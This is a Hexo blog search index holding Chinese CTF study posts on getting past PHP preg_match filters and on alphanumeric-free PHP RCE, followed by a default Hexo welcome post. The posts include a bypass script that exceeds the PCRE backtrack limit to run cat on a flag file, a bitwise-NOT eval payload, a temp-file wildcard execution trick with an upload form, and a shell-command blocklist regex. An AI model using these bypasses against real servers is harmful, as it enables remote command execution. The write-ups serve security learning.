<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Preg_match函数绕过</title>
    <link href="/2022/10/08/Preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/"/>
    <url>/2022/10/08/Preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="preg-match函数绕过"><a href="#preg-match函数绕过" class="headerlink" title="preg_match函数绕过"></a>preg_match函数绕过</h2><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>对于正则表达式的知识可以在以下链接学习一下</p><h3 id="preg-match函数"><a href="#preg-match函数" class="headerlink" title="preg_match函数"></a>preg_match函数</h3><p>preg_match 函数用于执行一个正则表达式匹配。</p><p>他的定义是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">preg_match</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$matches</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span> ]]] )<br><br></code></pre></td></tr></table></figure><p>搜索 subject 与 pattern 给定的正则表达式的一个匹配。</p><p>$subject是被搜索的字符串</p><p>$pattern是正则表达式</p><p>如下面的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//模式分隔符后的&quot;i&quot;标记这是一个大小写不敏感的搜索</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配的字符串 php。&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配的字符串 php。&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果为：查找到匹配的字符串 php。</p><img src="/2022/10/08/Preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/1.png" class=""><p>php手册告诉我们，preg_match函数一共会返回三类值，分别是1，0，false，那么当preg_math报错的时候就会返回false</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>由于preg_match函数只能出来字符串，所以传入的subject是数组的话就会返回false,但是如果后面的代码会转换字符串的话那么数组绕过就不行了</p><h3 id="多行绕过-n-0A"><a href="#多行绕过-n-0A" class="headerlink" title="多行绕过(\n,%0A)"></a>多行绕过(\n,%0A)</h3><p>由于preg_match函数只能匹配一行的字符串所以我们可以用\n或者%0A来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>.不会匹配换行符所以我们可以这样来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$json</span>=<span class="hljs-string">&quot;\nflag&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>$符不会匹配末尾的%0A所以我们可以这样绕过</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$json=<span class="hljs-string">&quot;flag%0a&quot;</span><br>``<br><br>### PCRE回溯次数限制<br><br>这个方法来自<br><br><span class="hljs-literal">[<span class="hljs-identifier">p</span>🐂的文章]</span>: https:<span class="hljs-comment">//www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x04-pcre</span><br><br>preg_match函数他的回溯规则如下(借用一下p🐂的图)<br><br>&#123;% asset_img <span class="hljs-number">2.</span>png %&#125;<br><br>这个函数有一个最大回溯次数<span class="hljs-number">100</span>万次，只要我们传的字符串超过<span class="hljs-number">100</span>万的长度，那么就会返回<span class="hljs-literal">false</span>，从而绕过<br><br>比如buu里面的一道题，源码如下<br><br>```php<br>&lt;?php<br><br>putenv(&#x27;PATH=/home/rceservice/jail&#x27;);<br><br><span class="hljs-keyword">if</span> (isset($_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>)) &#123;<br>  $json = $_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br><br>  <span class="hljs-keyword">if</span> (!is<span class="hljs-constructor">_string($<span class="hljs-params">json</span>)</span>) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; elseif (preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>^.<span class="hljs-operator">*</span>(<span class="hljs-params">alias</span>|<span class="hljs-params">bg</span>|<span class="hljs-params">bind</span>|<span class="hljs-params">break</span>|<span class="hljs-params">builtin</span>|<span class="hljs-params">case</span>|<span class="hljs-params">cd</span>|<span class="hljs-params">command</span>|<span class="hljs-params">compgen</span>|<span class="hljs-params">complete</span>|<span class="hljs-params">continue</span>|<span class="hljs-params">declare</span>|<span class="hljs-params">dirs</span>|<span class="hljs-params">disown</span>|<span class="hljs-params">echo</span>|<span class="hljs-params">enable</span>|<span class="hljs-params">eval</span>|<span class="hljs-params">exec</span>|<span class="hljs-params">exit</span>|<span class="hljs-params">export</span>|<span class="hljs-params">fc</span>|<span class="hljs-params">fg</span>|<span class="hljs-params">getopts</span>|<span class="hljs-params">hash</span>|<span class="hljs-params">help</span>|<span class="hljs-params">history</span>|<span class="hljs-params">if</span>|<span class="hljs-params">jobs</span>|<span class="hljs-params">kill</span>|<span class="hljs-params">let</span>|<span class="hljs-params">local</span>|<span class="hljs-params">logout</span>|<span class="hljs-params">popd</span>|<span class="hljs-params">printf</span>|<span class="hljs-params">pushd</span>|<span class="hljs-params">pwd</span>|<span class="hljs-params">read</span>|<span class="hljs-params">readonly</span>|<span class="hljs-params">return</span>|<span class="hljs-params">set</span>|<span class="hljs-params">shift</span>|<span class="hljs-params">shopt</span>|<span class="hljs-params">source</span>|<span class="hljs-params">suspend</span>|<span class="hljs-params">test</span>|<span class="hljs-params">times</span>|<span class="hljs-params">trap</span>|<span class="hljs-params">type</span>|<span class="hljs-params">typeset</span>|<span class="hljs-params">ulimit</span>|<span class="hljs-params">umask</span>|<span class="hljs-params">unalias</span>|<span class="hljs-params">unset</span>|<span class="hljs-params">until</span>|<span class="hljs-params">wait</span>|<span class="hljs-params">while</span>|[\<span class="hljs-params">x00</span>-\<span class="hljs-params">x1FA</span>-Z0-9!#-\<span class="hljs-operator">/</span>;-@\[-`|~\<span class="hljs-params">x7F</span>]+)</span>.*$/&#x27;, $json)) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    echo &#x27;Attempting <span class="hljs-keyword">to</span> run command:&lt;br/&gt;&#x27;;<br>    $cmd = json<span class="hljs-constructor">_decode($<span class="hljs-params">json</span>, <span class="hljs-params">true</span>)</span><span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br>    <span class="hljs-keyword">if</span> ($cmd !== NULL) &#123;<br>      system($cmd);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      echo &#x27;Invalid input&#x27;;<br>    &#125;<br>    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>我们写的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;nayi&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">##超过一百万，这里写一千万不会出结果。</span><br><br>res = requests.post(<span class="hljs-string">&quot;url&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phprce</title>
    <link href="/2022/10/06/phprce/"/>
    <url>/2022/10/06/phprce/</url>
    
    <content type="html"><![CDATA[<h1 id="最近学到的phpRCE"><a href="#最近学到的phpRCE" class="headerlink" title="最近学到的phpRCE"></a>最近学到的phpRCE</h1><h2 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h2><p>顾名思义，就是题目把数字和字母全都过滤了，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_mach</span>(<span class="hljs-string">&quot;/A-Z0-9a-z/is&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;CMD&quot;</span>]))<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;CMD&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="取反操作"><a href="#取反操作" class="headerlink" title="取反操作"></a>取反操作</h3><p>这样就导致不能出现任何数字字母，那么这样就得用到取反操作，就是先把我们需要执行的语句进行url编码再进行取反，其格式为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那么这样就能将其绕过</p><h3 id="执行临时文件里的内容"><a href="#执行临时文件里的内容" class="headerlink" title="执行临时文件里的内容"></a>执行临时文件里的内容</h3><p>这个方法来自p🐂的文章，看完过后我大为惊叹。</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><p>在linux中，被&#96;&#96;包裹起来的字符串可以被当作linux命令来执行，并且. 1.php表示执行1.php文件，那么我们就只需要上传一个可控的文件上去即可，</p><p>这时候就需要利用到临时文件了，具体可以看p🐂文章,临时文件的文件名是php开头后面跟六个随机字母，最后一个有可能是大写字母，那么我们的命令只需要写成. &#x2F;???&#x2F;????????&#x2F;[@-[]即可，[前面的&#x2F;是转义字符，不用写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.2.128&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中action改成题目的网址，然后在这个表单上上传文件，并且在bp中抓包输入我们需要自己执行的语句，这样就可以了</p><p>参考链接：</p><p><a href="https://www.xiinnn.com/article/c61c3788.html">https://www.xiinnn.com/article/c61c3788.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list</a></p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/10/06/hello-world/"/>
    <url>/2022/10/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
